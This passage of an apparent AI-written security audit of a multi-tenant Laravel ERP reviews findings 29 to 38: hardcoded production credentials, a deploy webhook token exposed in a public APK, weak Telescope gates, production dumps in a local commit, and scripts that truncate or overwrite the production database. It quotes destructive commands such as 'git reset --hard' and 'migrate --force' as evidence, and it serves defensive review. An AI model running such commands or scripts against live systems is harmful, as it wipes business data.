- `sendDatabaseBackupNotification` always deletes the .gz (around line 387), even when the send failed, so no server-side copy is kept. A failure only produces a `Log::error` line, or a FAILURE exit code from the `backup:telegram` command (app/Console/Commands/SendTelegramDatabaseBackupCommand.php).
- The caption claims the backup is "encrypted and secured" (مشفرة ومؤمنة), but nothing encrypts it.

routes/console.php schedules `backup:telegram` daily at 00:05. It has no `telescope:prune` or `model:prune` entry, and the grep found no restore command.

There is a further gap the finding does not mention, and it makes the problem worse. The scheduled command runs without any tenancy initialization and uses `DB::connection()`, so on this multi-tenant branch it only dumps the central/default database. Tenant databases, where invoices and stock live, get no backup from this path at all. Nothing anywhere stops or offsets these problems, so the high severity stands.

### 29. [HIGH] restore_sroor_db.py overwrites the production DB in place with no confirmation, from a 'latest' file that may be partial
- **Location:** `restore_sroor_db.py:20`
- **Effort:** M
- **Evidence:** restore_sroor_db.py:13 defaults to /home/<user>/db_backups/sroor_backup_latest.sql. Line 20 pipes it straight into `mysql ... <prod DB>` over SSH, with no prompt, no pre-restore snapshot, no checksum and no dry-run. In backup_sroor_db.py:42, `ssh.exec_command(cp ... latest)` is not awaited (no recv_exit_status), so a later run could pick up a half-copied 'latest'. Both scripts use paramiko AutoAddPolicy (no host-key pinning) and pass the DB password on the remote command line (visible in the process list). Hardcoded secrets: backup_sroor_db.py lines 4-7 (SSH host, port, user and password) and lines 9-11 (MySQL DB user and password); the same at restore_sroor_db.py lines 4-11. The server-side db_backups directory keeps both the .sql and the .gz forever, with no rotation. Only the legacy single DB is targeted, and there is no tenant restore at all.
- **Impact:** One mistaken run (or an AI agent running it) replaces live production data with an older or partial dump, and nothing undoes it. The secrets in the repo give anyone with repo access full shell and DB on prod.
- **Recommendation:** Delete these scripts from the repo and rotate the SSH and DB passwords. Provide a documented, tenant-aware `backup:restore {tenant} {snapshot}` artisan command that restores into a new DB, verifies it, then swaps it in only after explicit confirmation. Pin host keys. Use ~/.my.cnf or --defaults-extra-file instead of CLI passwords.
- **Verification:** I confirmed this from the code. D:\projects\sroor\restore_sroor_db.py:13 defaults to the server's db_backups/sroor_backup_latest.sql. Line 20 builds `mysql --user=... --password=<inline> --host=127.0.0.1 {DB_NAME} < {backup_file}` and runs it over SSH at line 21. There is no prompt, no pre-restore snapshot, no checksum or size check, and no dry-run. The only check is the exit status afterwards (lines 22-27).

Both scripts are tracked in git: they appear in `git ls-files`, and the last commit touching them is 76f32ce0. Both hardcode credentials. In restore_sroor_db.py, lines 4-7 hold the SSH host, port, user and password, and lines 9-11 hold the MySQL DB name, user and password. backup_sroor_db.py has the same at lines 4-11. Both scripts use paramiko AutoAddPolicy (restore line 16, backup line 26), so the host key is never pinned. Both put the DB password on the remote command line (restore line 20, backup line 34), where the process list can show it.

In backup_sroor_db.py:42, `ssh.exec_command('cp ... latest')` is never awaited with recv_exit_status. In practice the window is small, because the awaited gzip at lines 45-47 and the sftp download at line 57 come after it. Even so, the script never checks that the copy succeeded or finished, so a stale or partial 'latest' is possible. This sub-claim is a bit overstated, but it is not refuted.

Rotation: the backup creates a timestamped .sql and .gz on every run (lines 15-16) and never deletes old files.

Scope: only the single legacy DB is targeted (DB_NAME at line 9). Nothing in the scripts handles per-tenant databases.

I found no guard elsewhere that would stop this. These are standalone scripts run outside Laravel, so no middleware, policy or wrapper applies.

I am keeping severity at high. Committed production SSH and DB credentials, plus a one-command in-place overwrite of production with no confirmation, is a real data-loss and compromise risk. The partial-'latest' race is the weakest part of the finding.

### 30. [HIGH] Deploy webhook token is bundled inside the Android APK (Capacitor webDir = Laravel public/)
- **Location:** `backend/public/update_webhook.php:4`
- **Effort:** S
- **Evidence:** backend/capacitor.config.json sets "webDir": "public", so the whole Laravel public/ dir is copied into the app. android/app/src/main/assets/public/ contains update_webhook.php, with the token literal on line 4 (type: deploy webhook secret), plus app.apk and sroor-cofe-erp-2m.apk. backend/public/update_webhook.php (tracked) accepts the token via GET/POST (line 6), then runs `git reset --hard origin/main` and `artisan migrate --force` (lines 33-36) with no backup first, and echoes the command output back. capacitor.config also pins server.url to one tenant host with cleartext: true.
- **Impact:** Anyone who installs or unzips the APK can extract the token and trigger production redeploys and forced migrations at will. That is repeatable remote disruption, with schema changes and no backup before them. It also exposes internal output (paths, PHP binary).
- **Recommendation:** Remove update_webhook.php from public/ and rotate the token. Point Capacitor webDir at a dedicated build output (e.g. dist-mobile) that holds only SPA assets. Move deploys to CI, using SSH with a deploy key or a signed webhook (HMAC header, not a query param) that takes a pre-deploy backup and runs tenants:migrate.
- **Verification:** I confirmed this from the code and the build outputs. backend/capacitor.config.json sets "webDir": "public", server.url points to a single tenant host, and cleartext is true. backend/public/update_webhook.php is tracked in git. Line 4 holds a hardcoded deploy webhook secret. Line 6 accepts the token from GET or POST and compares it with plain !==. Lines 32-37 run git fetch, git reset --hard origin/main, artisan migrate --force and optimize:clear, with no backup step. Lines 39-45 echo the PHP binary path and the full shell output back to the caller.

The file under android/app/src/main/assets/public/ has the same SHA-256 hash as the one in public/. That assets folder is gitignored by backend/android/.gitignore:96, so it is a local build copy. More importantly, I opened the built APKs as zips. Both backend/public/app.apk and the copy under assets contain assets/public/update_webhook.php. They also contain nested copies of older APKs (assets/public/app.apk and assets/public/sroor-cofe-erp-2m.apk), which also makes the APKs much bigger.

The APK is handed out publicly. DownloadLatestApkAction.php:34-35 serves public_path('sroor-cofe-erp-2m.apk') and public_path('app.apk'), and useAppUpdater.js:57 falls back to '/app.apk'. Anyone who downloads and unzips the app can read the token.

Two caveats lower the impact a little:
- The same token is already in tracked files: .github/workflows/deploy.yml:49 and the root update_webhook.php. So the APK is an extra, public way to get a secret that is already in the repo.
- The endpoint only resets to origin/main, so an attacker cannot inject code. What they can do is trigger redeploys and forced migrations whenever they want, without authentication, and read shell output.

I did not check whether the endpoint is live on the server. Overall the claim holds and high is the right severity. Fix: rotate the token, remove the webhook from public/, keep APKs and PHP files out of webDir (use a dedicated SPA dist folder), and use a signed or IP-restricted deploy trigger.

### 31. [HIGH] Telescope is on in production behind a weak gate (token in query string, plaintext api_token lookup, hardcoded phone/email allowlist); Pulse gate uses hardcoded phones
- **Location:** `backend/app/Providers/TelescopeServiceProvider.php:62`
- **Effort:** S
- **Evidence:** composer.json:13 has "laravel/telescope": "*" in require (not require-dev). config/telescope.php:19 has enabled=env('TELESCOPE_ENABLED', true). The viewTelescope gate reads request()->query('token'), resolves it as a Sanctum PAT or as a plaintext users.api_token (line 69), and then calls auth('web')->login($user, true), a persistent remember-me login. Access is granted to role 'admin' (not just super_admin) or to hardcoded phone and email lists (lines 81-86). AppServiceProvider.php:48-50 grants viewPulse by hardcoded phone, and Gate::before (line 38) grants every ability to the same hardcoded phones in whatever DB the user lives in. The Telescope filter records everything when APP_ENV=local (line 25), and .env.example defaults to APP_ENV=local.
- **Impact:** Bearer tokens end up in access logs and browser history through ?token=. Any user in the central DB with role 'admin' sees Telescope (exceptions, queries, payloads, possibly tenant data). If a tenant can create a user with one of the allowlisted phones in its own DB, Gate::before treats that user as all-powerful in that context. A prod box running with APP_ENV=local records every request body.
- **Recommendation:** Move Telescope to require-dev, or keep it disabled in prod (TELESCOPE_ENABLED=false) and use Sentry or Nightwatch instead. Gate both Telescope and Pulse strictly on an authenticated central super_admin session, with no query tokens and no phone/email allowlists. Remove the phone shortcut from Gate::before. Enable stancl's TelescopeTags feature if Telescope is kept, so entries carry tenant tags.
- **Verification:** The finding holds up against the code. I could not refute any part of it.

**Telescope is on in production**
- backend/composer.json:13 puts "laravel/telescope": "*" in require, and "dont-discover" is empty.
- backend/bootstrap/providers.php registers both Laravel\Telescope\TelescopeServiceProvider and App\Providers\TelescopeServiceProvider for every environment.
- config/telescope.php:19 defaults 'enabled' to env('TELESCOPE_ENABLED', true).
- config/telescope.php:95-98 protects the routes with only 'web' and Authorize.

**The viewTelescope gate is weak** (TelescopeServiceProvider.php:59-87)
- The `$user = null` default lets the gate run for guests.
- It reads `request()->query('token')` and resolves it two ways: through Sanctum findToken, then through a plaintext `User::where('api_token', $token)` lookup.
- It then calls `auth('web')->login($user, true)`, a persistent remember-me login.
- It allows role 'admin' as well as super_admin, plus hardcoded phones (line 82) and hardcoded emails (lines 83-86).

**Plaintext tokens are stored and accepted in the URL**
- ApiLoginAction.php:84-90 copies the full Sanctum plainTextToken into users.api_token in plaintext. ApiQuickLoginAction.php:59 writes the same column.
- So a database read leaks usable credentials.
- ApiTokenAuth.php:21 also accepts `?api_token=` in the query string.

**A second, looser entry point the finding missed** (routes/web.php:17-48)
- A /telescope-access route does the same token-in-query lookup.
- It allows ANY email ending in '@baraa-solutions.com' (str_ends_with), which is looser than the gate.
- It also does a persistent login and then redirects to /telescope.

**Hardcoded phones in other gates** (AppServiceProvider.php)
- Line 38: Gate::before returns true for the hardcoded phones. This runs before the super_admin.* deny branch on line 41, so these phones get every ability, including super_admin.*, in whatever database the user lives in.
- Line 49: viewPulse is also granted by hardcoded phone.

**APP_ENV=local records everything** (TelescopeServiceProvider.php)
- Line 25: when APP_ENV=local, the filter records every entry.
- Line 39: hideSensitiveRequestDetails returns early, so cookie and CSRF headers are no longer hidden.
- .env.example:2 sets APP_ENV=local.
- In a local environment the stock Telescope authorization lets anyone in without checking the gate. So a production box that copies .env.example would serve Telescope to everyone.

**Where the impact is overstated**
- The /telescope web routes run in central context. A tenant's Sanctum token or api_token is looked up in the central DB, so a tenant-only user cannot reach Telescope through this path.
- A tenant user with an allowlisted phone gets Gate::before powers only inside their own tenant DB. A tenant admin already has most of those powers there, and central super-admin routes do not accept tenant tokens.
- I could not verify the production .env from the repo.

**Why severity stays high**
- Credentials are exposed through URLs and through plaintext storage.
- The login is persistent.
- The allowlists are hardcoded backdoors.
- Telescope ships in production.

Evidence files:
- D:\projects\sroor\backend\app\Providers\TelescopeServiceProvider.php
- D:\projects\sroor\backend\app\Providers\AppServiceProvider.php
- D:\projects\sroor\backend\routes\web.php
- D:\projects\sroor\backend\app\Actions\Auth\ApiLoginAction.php
- D:\projects\sroor\backend\app\Http\Middleware\ApiTokenAuth.php
- D:\projects\sroor\backend\bootstrap\providers.php
- D:\projects\sroor\backend\config\telescope.php
- D:\projects\sroor\backend\composer.json

### 32. [HIGH] Production DB dumps and ~40 more password-bearing scripts sit in the local WIP commit, which is not pushed yet
- **Location:** `backups/sroor_backup_latest.sql`
- **Effort:** S
- **Evidence:** Local HEAD commit 76f32ce0 'WIP: epitaxy pre-switch' (94 files) adds backups/sroor_backup_20260831_151852.sql (7.4MB), its .sql.gz, backups/sroor_backup_latest.sql, sroor_prod_2026-09-29.sql.gz and sroor_prod_copy_before_recost_2026-09-29.sql.gz. It also adds cost CSVs, an HTML/PDF cost report, and ~70 ops scripts (backup_sroor_db.py, restore_sroor_db.py, check_*.py ...). `git branch -a --contains 76f32ce0` lists only the local feature/multi-tenant, so no remote has it yet. `git grep` finds hardcoded password assignments in 80 tracked files at HEAD, against 38 on origin/feature/multi-tenant. I did not open the dumps; their contents are inferred from the filenames ('prod').
- **Impact:** The next `git push` (or deploy_root_baraa.py, which runs `git push`) publishes full production customer and financial data, plus more server credentials, to GitHub. The repo also mirrors to a second remote (erp-hub). That is a data breach for the live tenant and a serious problem for a SaaS vendor.
- **Recommendation:** Do NOT push this branch as it is. Rewrite the unpushed commit: soft-reset 76f32ce0, unstage backups/ and the credential scripts, and re-commit only .claude/, CLAUDE.md and the docs. Move the dumps to encrypted off-repo storage. Add /backups/, *.sql and *.sql.gz to .gitignore before anything else. Add a pre-commit secret and size hook (gitleaks or detect-secrets).
- **Verification:** The core claim holds. `git log -1 --stat` on HEAD 76f32ce0 ("WIP: epitaxy pre-switch") shows it adds backups/sroor_backup_20260831_151852.sql (21,806 lines), its .sql.gz, backups/sroor_backup_latest.sql, backups/sroor_prod_2026-09-29.sql.gz, backups/sroor_prod_copy_before_recost_2026-09-29.sql.gz, the cost-audit and recost CSVs, an HTML cost report and a PDF.

I read only the header and table names of backups/sroor_backup_latest.sql, no values. It is a real MariaDB dump of the Hostinger production database ([HOSTING_ACCOUNT]). It has INSERT data for users (password hashes), customers, suppliers, invoices, payments, purchases, stock_movements, settings and telescope_entries. Telescope entries can hold request payloads and tokens.

Nothing in .gitignore excludes *.sql, *.sql.gz or backups/. Only *.tar.gz and *.sqlite are ignored.

`git branch -a --contains 76f32ce0` lists only the local feature/multi-tenant branch, and `git log origin/feature/multi-tenant..HEAD` shows only this commit. So it is not pushed yet. Two GitHub remotes are configured: origin (sroor-cofe-erp) and erp-hub.

deploy_root_baraa.py lines 28-32 run `git add .`, then `git commit`, then `git push`. Running a release would push this commit, and `git add .` would sweep in anything else in the tree.

Why the severity is lower:
1. Nothing has leaked yet. The commit is local only, so this is a latent risk, not a breach that has happened.
2. I could not check whether the GitHub repos are private. If they are, a push exposes the data to repo collaborators rather than the public. It would still be a serious leak, and hard to scrub from git history.
3. The "80 vs 38 password-bearing files" figure did not reproduce. My regex for hardcoded password assignments found 14 files at HEAD against 11 on origin/feature/multi-tenant. More credential-bearing scripts are being added, but far fewer than ~40.

It is real and urgent: purge the commit, ignore backups/ and *.sql*, and rotate any credentials involved. Because nothing is published yet, high fits better than critical.

### 33. [HIGH] Release flow is a local Python script that bumps the version, runs `git add .` and pushes; this is how the junk got committed
- **Location:** `deploy_root_baraa.py:30`
- **Effort:** L
- **Evidence:** deploy_root_baraa.py imports bump_version, runs npm build, then subprocess git add . / git commit 'chore(release): bump version' / git push from the repo root. bump_version.py:6 hardcodes r'd:\projects\sroor\backend' and writes the same JSON to backend/version.json and backend/resources/js/version.json (both 1.0.135 / build 135). Gradle (1.0.2/3), desktop/package.json (1.0.0) and app_versions rows (1.1.0/110, set by hand over SSH in publish_windows_version.py, which also calls ->delete() on the 2.0.0 row) are never synced.
- **Impact:** Four separate version numbers that disagree. Releases depend on one developer's Windows machine. `git add .` sweeps screenshots, .pyc files, dumps and credential scripts into commits. Production app_versions is edited by ad-hoc PHP dropped onto the server.
- **Recommendation:** Use one source of truth: a git tag vX.Y.Z, or a single root VERSION / package.json version. CI derives versionCode as MAJOR*10000+MINOR*100+PATCH and passes it to Gradle (-PversionName/-PversionCode), electron-builder (--config.extraMetadata.version) and Vite (define __APP_VERSION__; drop the two version.json copies). A GitHub Actions release job on tag builds the signed APK/AAB and the signed NSIS installer, uploads them to GitHub Releases, and calls an authenticated super-admin API (POST /super-admin/app-versions with a CI token) carrying the URL, size and sha256. Retire bump_version.py, deploy_root_baraa.py and publish_windows_version.py.
- **Verification:** I confirmed this from the code and git history.

**The release script**
- `deploy_root_baraa.py:16` calls `bump_version()`.
- Line 26 runs `npm run build`.
- Lines 30-32 run `git add .`, then `git commit -m "chore(release): bump version to v…"`, then `git push`, all from the repo root.
- The script then SSHes to Hostinger using a hardcoded host, user and plaintext SSH password (lines 9-12). I am reporting only the type of secret, not its value.
- The remote deploy hard-resets to `origin/feature/api-migration` (lines 71-72). That is not the SaaS branch (`feature/multi-tenant`), so this flow also deploys an unexpected branch.

**The version bump**
- `bump_version.py:6` hardcodes `d:\projects\sroor\backend`.
- It writes the same JSON to `backend/version.json` and `backend/resources/js/version.json`. Both currently read 1.0.135, build 135.

**Version numbers that don't match**
- `backend/android/app/build.gradle:10-11` has versionCode 3 and versionName "1.0.2".
- `desktop/package.json:3` has "1.0.0".
- `publish_windows_version.py:20` runs `AppVersion::where('version_name','2.0.0')->delete()`. Lines 22-44 set 1.1.0 / version_code 110 for both windows and android. It does this by uploading `set_version_110.php` over SFTP, running it, and then running `rm` (lines 61-65).

**The sweep committing junk and credential scripts**
- `git log` shows 122 `chore(release)` commits.
- `__pycache__/bump_version.cpython-312.pyc` was first added by release commit 8e1058e3 ("bump version to v1.0.3").
- One release commit added `publish_windows_version.py`, a script that holds SSH credentials (67 lines).
- 225 tracked binary/dump-type files exist. Most are e2e screenshots, and those came in through ordinary commits, not the release sweep.
- `.gitignore` does not exclude `*.pyc`, `__pycache__` or `backend/e2e/screenshots`.

**Overstatement**
The claim that the release flow is how *all* the junk got committed is too strong: many screenshots and `after_submit.png` arrived through normal commits. The core finding still stands. Releases depend on one developer's Windows machine and are not reproducible, version numbers disagree across four places, and an unconditional `git add .` sweep has committed `.pyc` files and a credential-holding script.

I am keeping the severity at high because the sweep has already pushed credential scripts to GitHub and production data is changed by ad-hoc PHP dropped onto the server.

### 34. [MEDIUM] The deploy webhook token is hardcoded in the CI workflow and the webhook files; the endpoint does `git reset --hard` and `migrate --force` and returns the full command output
- **Location:** `D:/projects/sroor/backend/public/update_webhook.php:4`
- **Effort:** S
- **Evidence:** The token type is a deploy webhook token. It appears at update_webhook.php:4 and backend/public/update_webhook.php:4 ($secretToken = '<token>'), and at .github/workflows/deploy.yml:49, where it is passed in the URL query string ?token=<token>. The check is plain !== on $_GET/$_POST (not hash_equals), which then runs git fetch, `git reset --hard origin/main` and `artisan migrate --force`. The JSON response echoes the full exec output. The file sits under public/ (origin/main also tracks public/update_webhook.php), so it is reachable over HTTP at sroor.baraa-solutions.com. deploy.yml:49 ends with `|| echo "Deployment triggered successfully."`, so a failed deploy still shows green. The token is guessable (project name, year and initials) and is in the pushed history.
- **Impact:** Anyone holding the token can force a production code reset and run migrations on demand, for example mid-shift, and read the server's git/migrate output (paths, errors). The token also ends up in web server access logs. A failed deploy is reported as success in CI.
- **Recommendation:** Rotate the token and store it as a GitHub Actions secret. Send it as a header and compare with hash_equals. Better, replace the webhook with an SSH-key deploy job in CI. Remove update_webhook.php from public/. Never echo command output. Drop the `|| echo` fallback.
- **Verification:** The finding is real; I read the code and confirmed each claim.

**What the code shows**
- **Same hardcoded token in three places:**
  - `D:/projects/sroor/backend/public/update_webhook.php:4` (`$secretToken = '...'`)
  - `D:/projects/sroor/update_webhook.php:4`
  - `D:/projects/sroor/.github/workflows/deploy.yml:49`, where it is sent as the `?token=` query string to sroor.baraa-solutions.com.
  - All three files are tracked in git. `origin/main` also tracks `public/update_webhook.php`, `update_webhook.php` and `deploy.yml`. The webhook first appeared in commit `26f47ec7`.
- **The token looks guessable.** It is 33 characters of lowercase words joined by underscores, plus a 4-digit year and a 2-letter suffix. That is consistent with the claim that it is made from the project name, the year and initials.
- **The check is weak.** It is a plain `!==` comparison against `$_GET`/`$_POST`, not `hash_equals`.
- **What the endpoint runs:** `git fetch --all`, `git reset --hard origin/main`, `artisan migrate --force`, then `optimize:clear`.
- **The response leaks output.** The JSON reply includes the full `exec` output and the PHP binary path.
- **Nothing else protects it.** No route, middleware or other guard applies. `backend/public/.htaccess` only sends requests for non-existent files to `index.php`, so this existing file is served directly by Apache.
- **CI reports a failed deploy as success.** Both curl calls use `-f`, and the chain ends with `|| echo "Deployment triggered successfully."`, so the step exits 0 even when the deploy fails.

**Why I lowered it from high to medium**
- The endpoint takes no input from the attacker except the token. It can only redeploy whatever is already on `origin/main`, so this is not remote code execution.
- Realistic harm from someone holding the token:
  - force an unplanned production reset and migration at any time, for example mid-shift;
  - wipe any uncommitted hotfixes on the server via the hard reset;
  - read git and migration output, including server paths and errors.
- Other weaknesses:
  - the token now sits in git history and in web server access logs, so it must be rotated, not just removed;
  - failed deploys are hidden from CI.

These are real security and hygiene problems, but they are bounded. How exposed the token is depends on whether the repository is public, which the code does not show.

### 35. [MEDIUM] Root data-fix scripts hard-delete and rewrite production money data with hardcoded IDs and no dry run
- **Location:** `D:/projects/sroor/fix_duplicate_payments.py:28`
- **Effort:** L
- **Evidence:** fix_duplicate_payments.py:28-31 hard-deletes Payment rows by hardcoded customer_id/payment_number on sroor prod. A DB::transaction is used, but there is no soft delete or audit trail. seed_fresh_direct.py:33-42 truncates users, customers, suppliers, items, invoices, payments, stock_movements and audit_logs on the sroor production path (TARGET at line 15) and reseeds users with hardcoded bcrypt passwords at lines 58 and 69. run_cost_sync.py:41-83, run_reconcile_fifo.py:30-71, update_invoices_total_cost.py:25-34 and update_exp_db.py:21 rewrite cost_price/total_cost/cost_center in prod. Each script uploads a PHP file into public_html over SFTP, runs it, then deletes it. restore_sroor_db.py:13-21 restores sroor_backup_latest.sql over the live DB by default, with no prompt.
- **Impact:** These scripts break the 'no hard delete of approved documents' rule and leave no reproducible, reviewed or tested record of how financial data was changed. While the temp PHP file sits in public_html it is web-reachable, and a re-run causes damage: seed_fresh_direct wipes all business data, and restore rolls prod back to an old dump.
- **Recommendation:** Rebuild the needed fixes as tested, idempotent, tenant-aware artisan commands under backend/app/Console/Commands, each with --dry-run, --tenant=, a production confirmation and an audit log entry (a recalculate-costs command already exists as a proposal in backups/cost_fix_proposed_*). Delete the one-shot scripts once they are applied.
- **Verification:** The finding is real but some parts are overstated. I read all seven scripts. Each is tracked in git, connects over SSH to the Hostinger production host, writes a PHP file into the sroor public_html app root, runs it and then deletes it. None has a dry-run mode or a confirmation prompt.

What holds up:
- seed_fresh_direct.py:31-45 turns off foreign-key checks and TRUNCATEs invoices, invoice_items, purchases, payments, stock_movements, audit_logs, customers, suppliers, items, users and role tables on TARGET (line 15, the sroor prod path). It then re-creates admin users with hardcoded passwords at lines 58 and 69. TRUNCATE bypasses soft deletes and observers, so one run wipes all business data.
- restore_sroor_db.py:13 defaults to /home/.../db_backups/sroor_backup_latest.sql and pipes it into mysql on the live DB at line 20, with no prompt.
- run_cost_sync.py:41-87 rewrites InvoiceItem.cost_price and StockMovement.unit_cost. update_invoices_total_cost.py:25-37 rewrites total_cost on every invoice, with no status filter. update_exp_db.py:21 mass-updates expense cost_center.
- One small error in the claim: run_reconcile_fifo.py:30-76 does not touch cost. It rewrites paid_amount, remaining_amount and payment_status on all confirmed invoices.
- No migration, command, test or audit record covers any of these changes. Every script also hardcodes the SSH password, and restore_sroor_db.py hardcodes the DB password (lines 7, 11, 14). Those are plaintext credentials.

What is overstated:
- The headline example is wrong. fix_duplicate_payments.py:28-31 calls Eloquent ->delete() on Payment. backend/app/Models/Payment.php:11 uses SoftDeletes, so this is a soft delete, not a hard delete. It still leaves no audit trail: I found no Payment observer.
- The "web-reachable temp PHP" claim is mostly countered. The repo-root .htaccess rewrites every request outside /public/ to public/$1, so a file at the app root is not served directly, as long as that .htaccess is deployed.

The hazard is operational: someone has to run a script by hand. Because the headline hard-delete is wrong and web exposure is largely mitigated, I lowered severity from high to medium. The seed_fresh_direct.py truncate and the no-prompt restore remain the serious items.

### 36. [MEDIUM] The CI test job runs at the repo root, where there is no composer.json, so it fails and the deploy job never runs
- **Location:** `D:/projects/sroor/.github/workflows/deploy.yml:30`
- **Effort:** M
- **Evidence:** No step sets working-directory. The steps run `composer update ...` (line 30), `cp .env.example .env`, `php artisan key:generate` and `php artisan test`, all at the repo root. `git ls-files` shows the repo root has no composer.json and no artisan; both moved to backend/ in commit e85c1d62 (2026-08-20). The workflow was last changed on 2026-08-18. The workflow only triggers on main and master (lines 5-7), so pushes to feature/multi-tenant get no CI at all. It also uses `composer update` instead of `install`, which ignores composer.lock. It has no npm ci or vite build, no Pint (laravel/pint is in require-dev, but there is no pint.json), no PHPStan, and no Playwright step.
- **Impact:** Nothing tests the SaaS branch, and on main the test job fails at the first composer step. Any 'green' signal the team relies on does not exist. Releases are actually built and pushed by hand from a developer machine (deploy_root_baraa.py).
- **Recommendation:** Rewrite CI with `defaults.run.working-directory: backend`. Use `composer install --no-interaction --prefer-dist` (the lock file targets PHP 8.3.30, so test on 8.3 to match production), `php artisan test`, `vendor/bin/pint --test`, `npm ci && npm run build`, and a Playwright smoke run against `php artisan serve`. Trigger on pull_request plus pushes to main and feature/**.
- **Verification:** Mostly confirmed on feature/multi-tenant, but one part of the impact is wrong. The issue is latent, not live.

Confirmed in D:/projects/sroor/.github/workflows/deploy.yml:
- No step sets `working-directory`.
- Line 30 runs `composer update`, not `install`.
- Lines 34-38 run `cp .env.example .env`, `php artisan key:generate` and `php artisan test`, all from the repo root.
- Lines 5-7 trigger only on pushes to main and master, so feature/multi-tenant gets no CI.
- On this branch, `git ls-files` shows only backend/composer.json, backend/composer.lock and backend/artisan. There is no root composer.json or artisan; they moved in commit e85c1d62 (2026-08-20).
- The workflow was last changed in commit 26f47ec7 (2026-08-08), before that move.
- The job has no npm, Vite, Pint, PHPStan or Playwright steps.

Overstated: "on main the test job fails at the first composer step" is false today. `git ls-tree main` shows composer.json and artisan still at the root of main, so the current main CI can install and run. It breaks only when feature/multi-tenant is merged into main without fixing the workflow.

So the real defect is:
- The SaaS branch has no CI at all.
- The workflow is incompatible with this branch's backend/ layout and will fail after the merge.

Medium, not high, because nothing is broken on main yet.

Related, outside this finding: deploy.yml:49 hardcodes a secret in plaintext. It is a deploy webhook token placed in a URL query string. It should be moved to GitHub secrets.

### 37. [MEDIUM] No tenant migration rollout on deploy; tenants:migrate aborts on first failing tenant
- **Location:** `deploy.sh:32`
- **Effort:** M
- **Evidence:** deploy.sh:32 `artisan migrate --force --seed || true` and update_webhook.php:36 `artisan migrate --force` touch the central DB only. Neither file nor .github/workflows/deploy.yml contains `tenants:migrate`. The only per-tenant paths are the manual super-admin endpoint SuperAdminApiController::runTenantMigrations (line 222, one tenant, synchronous in HTTP, `Artisan::call` exit code ignored and raw output returned to the client) and the hardcoded `--tenants=2m || true` in deploy_root_baraa.py. The vendor Migrate::handle uses tenancy()->runForMultiple with no try/catch, so one failing tenant stops the loop.
- **Impact:** After a release that adds tenant migrations (35 tenant migrations exist), every tenant DB except the one manually migrated runs new code against an old schema. That produces 500s on 'column not found' in invoices and stock paths. The `|| true` hides failures, so nobody is alerted.
- **Recommendation:** Add a release step `php artisan migrate --force && php artisan tenants:migrate --force`, wrapped by a custom `tenants:migrate-all` command. That command should iterate Tenant::cursor(), run per tenant in try/catch, record schema_version/last_migrated_at/last_migration_error on the tenant row, exit non-zero if any failed, and notify. Enable maintenance mode per release, and fail the deploy instead of `|| true`.
- **Verification:** The core claims check out in the code, but the impact is overstated.

What I confirmed:
- deploy.sh:32 runs `artisan migrate --force --seed || true`. update_webhook.php:36 runs `artisan migrate --force`. Both touch only the central/default connection.
- No deploy file calls `tenants:migrate`: not deploy.sh, not update_webhook.php, not .github/workflows/deploy.yml. A grep of the repo finds only these per-tenant calls:
  - SuperAdminApiController.php:226, one tenant at a time, synchronous inside the HTTP request. It returns success:true with the raw `Artisan::output()` and ignores the exit code.
  - deploy_root_baraa.py:125, `tenants:migrate --tenants=2m --force || true`.
  - PopulateRealisticTenantDataCommand.php:106.
- The vendor code works as claimed. Stancl Migrate::handle calls `tenancy()->runForMultiple`, and Tenancy.php:154-161 loops `initialize` and `callback` with no try/catch, so the first tenant that throws stops the run for every tenant after it.
- There are 35 tenant migrations, and config/tenancy.php sets migration_parameters `--force=true`.
- New tenants are migrated on creation: TenancyServiceProvider runs CreateDatabase and then MigrateDatabase on TenantCreated. Existing tenants never get new migrations automatically.

Why it is overstated:
- deploy.sh, update_webhook.php and deploy.yml all target `origin/main`, which is the old single-tenant app at the repo root. `git show main:backend/config/tenancy.php` fails because that file does not exist on main.
- On this branch the app lives in backend/ and there is no root composer.json, so this CI/webhook pipeline cannot deploy the SaaS branch at all.
- So the impact "every release leaves all tenants except one on an old schema, producing 500s on column not found" is a latent gap, not a current production failure. Today there is no automated SaaS release path; the only one is the manual deploy_root_baraa.py, and it migrates only tenant 2m.

The finding is still real. The SaaS branch has no rollout step for existing tenants, `|| true` hides failures, and one bad tenant stops the run for every tenant after it in the loop.

Side note: deploy.yml and update_webhook.php:4 contain a hardcoded deploy webhook token (type: shared-secret URL token). I am not reproducing the value.

### 38. [MEDIUM] Tenant provisioning is synchronous, non-atomic, and silently swallows CREATE DATABASE failures
- **Location:** `backend/app/Services/Tenancy/SafeMySQLDatabaseManager.php:19`
- **Effort:** L
- **Evidence:** createDatabase() catches every Throwable and `return true` ('On Shared Hosting where DB is pre-created in hPanel'). deleteDatabase() also swallows everything. TenancyServiceProvider.php:27-32 runs CreateDatabase+MigrateDatabase with shouldBeQueued(false) inside Tenant::create(). TenantProvisionerService::provision (lines 55-132) does Tenant::create, then domains, Subscription::create, then $tenant->run(seed permissions, store, admin, settings). None of it is in a transaction and there is no status/provisioning state. On Hostinger the prefix is set to the hosting account prefix (TENANT_DB_PREFIX in deploy_root_baraa.py), and the app MySQL user normally cannot CREATE DATABASE. The real error therefore surfaces later as a confusing MigrateDatabase connection error.
- **Impact:** Any failure after Tenant::create leaves an orphan tenant row (id = slug) with possibly a domain and no or partial DB. Retrying the same slug then fails on duplicate PK. The tenant still resolves via ResolveApiTenancy, which has no status check, and serves 500s. The HTTP request can also time out during 35 migrations. A failed DROP DATABASE on delete is silently ignored, leaving orphaned customer data.
- **Recommendation:** Add a `provisioning_status` column (pending/creating_db/migrating/seeding/ready/failed + error). Create the tenant row first, then dispatch a queued, idempotent ProvisionTenantJob chain (CreateDatabase, MigrateDatabase, Seed, CreateAdmin) on a central-connection queue. Rethrow DB-creation errors, except a pre-created-DB mode that explicitly verifies connectivity using the supplied tenancy_db_* credentials. Block tenant resolution until status=ready. Provide retry and cleanup actions.
- **Verification:** I confirmed the finding in the code, but it is somewhat overstated, so I lowered it to medium.

**What the code shows:**
- **CREATE DATABASE errors are swallowed.** `backend/app/Services/Tenancy/SafeMySQLDatabaseManager.php:19-24` wraps the CREATE DATABASE statement in `catch (Throwable) { return true; }`. `deleteDatabase()` at lines 27-33 swallows every error the same way.
- **The swallowing manager is the one in use.** `config/tenancy.php:65-66` registers it for both mysql and mariadb.
- **Provisioning runs inside the request.** `TenancyServiceProvider.php:26-32` runs CreateDatabase and MigrateDatabase with `shouldBeQueued(false)` on the TenantCreated event. Tenant deletion (lines 39-44) is also synchronous.
